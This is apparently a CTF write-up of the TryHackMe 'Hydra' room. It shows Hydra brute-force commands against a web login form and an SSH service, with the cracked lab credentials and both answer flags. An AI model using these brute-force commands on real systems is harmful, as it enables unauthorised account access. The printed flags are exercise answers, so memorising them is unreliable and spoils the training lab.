# TryHackMe: Hydra - CTF Write-up

**Room Link:** [https://tryhackme.com/room/hydra](https://tryhackme.com/room/hydra)

This documentation details the successful compromise of the TryHackMe "Hydra" room. The objective was to utilize the `hydra` brute-forcing tool on Kali Linux to crack an online web authentication form and a network SSH service to retrieve two flags.

## Task 1: Cracking the Web Login (Flag 1)

The first objective was to brute-force the web login portal. After identifying the POST request parameters (`username` and `password`) and the failure message (`Your username or password is incorrect.`), we configured Hydra to attack the form using the `rockyou.txt` wordlist.

**Command Executed:**
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.149.108 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
```
Result:
Hydra successfully cracked the password for the user molly.

<img width="948" height="880" alt="Screenshot 2026-04-29 164625" src="https://github.com/user-attachments/assets/d6398637-51dc-4928-b7a7-c1fc84b46879" />

Credentials Found: molly : sunshine

Logging into the web application at http://10.49.149.108 with the newly discovered credentials revealed the first flag on the landing page.

<img width="957" height="892" alt="Screenshot 2026-04-29 164956" src="https://github.com/user-attachments/assets/c10be562-661a-428f-bf04-ea428e4e71ca" />

Flag 1: THM{2673a7dd116de68e85c48ec0b1f2612e}

 ## Task 2: Cracking SSH & System Access (Flag 2)
Next, we targeted the SSH service running on port 22 of the target machine. We ran another Hydra attack against the same user, molly, limiting the tasks to 4 threads (-t 4) to ensure a stable connection.

**Command Executed:**

```Bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.149.108 ssh -t 4
```
Result:
Hydra quickly identified the SSH password.

<img width="947" height="213" alt="Screenshot 2026-04-29 165306" src="https://github.com/user-attachments/assets/363a5b1b-68aa-4cd9-b525-0cbeb5792209" />

Credentials Found: molly : butterfly

With valid SSH credentials, we established a remote connection to the target machine.

Command Executed:

```Bash
ssh molly@10.49.149.108
```
<img width="953" height="666" alt="Screenshot 2026-04-29 165638" src="https://github.com/user-attachments/assets/c8545f3c-d79b-4610-8cb8-cffd1432832f" />

Once authenticated and logged into the Ubuntu system, we enumerated the home directory and located the final flag.

```Bash
molly@ip-10-49-149-108:~$ ls
flag2.txt
```
<img width="303" height="34" alt="Screenshot 2026-04-29 165646" src="https://github.com/user-attachments/assets/731ad4fd-ceba-48a6-aae1-415129076584" />

```Bash
molly@ip-10-49-149-108:~$ cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
```
<img width="356" height="33" alt="Screenshot 2026-04-29 165655" src="https://github.com/user-attachments/assets/9e121616-cc2c-47d6-8d8c-163c14da8037" />

Flag 2: THM{c8eeb0468febbadea859baeb33b2541b}

## Summary
The room is now fully completed.

Web Credentials Discovered: molly : sunshine

SSH Credentials Discovered: molly : butterfly

Tools Utilized: hydra, SSH
